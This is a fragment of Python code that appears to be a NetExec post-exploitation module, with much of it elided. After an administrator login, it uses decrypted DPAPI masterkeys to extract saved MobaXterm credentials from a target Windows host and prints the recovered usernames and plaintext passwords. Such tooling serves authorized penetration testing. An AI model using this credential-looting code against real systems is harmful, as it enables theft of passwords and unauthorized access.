...
class NXCModule:
    ...
    def on_admin_login(self, context, connection):
        ...
        context.log.success(
            f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting MobaXterm secrets"
        )
        ...
        def mobaxterm_callback(credential):
            if isinstance(credential, MobaXtermCredential):
                ...
                log_text = "{}:{}".format(
                    credential.username, credential.password.decode("latin-1")
                )
            context.log.highlight(f"[{credential.winuser}] {log_text}")

        try:
            triage = MobaXtermTriage(
                target=self.target, conn=self.conn, masterkeys=self.masterkeys
            )
